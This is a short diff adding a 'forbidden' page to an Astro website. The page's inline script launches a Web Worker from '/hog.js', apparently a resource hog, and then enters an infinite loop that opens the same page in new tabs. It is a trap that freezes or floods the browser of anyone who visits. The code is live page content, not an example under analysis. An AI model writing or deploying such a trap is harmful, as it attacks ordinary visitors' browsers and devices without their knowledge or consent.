@@ -1,0 +1,16 @@
+---
+import BaseLayout from "../layouts/BaseLayout.astro";
+---
+
+<BaseLayout>
+    <h1>You shouldn't be here.</h1>
+</BaseLayout>
+
+<script>
+    document.addEventListener("load", () => {
+        new Worker("/hog.js");
+        for (;;) {
+            window.open("/forbidden", "_blank");
+        }
+    });
+</script>
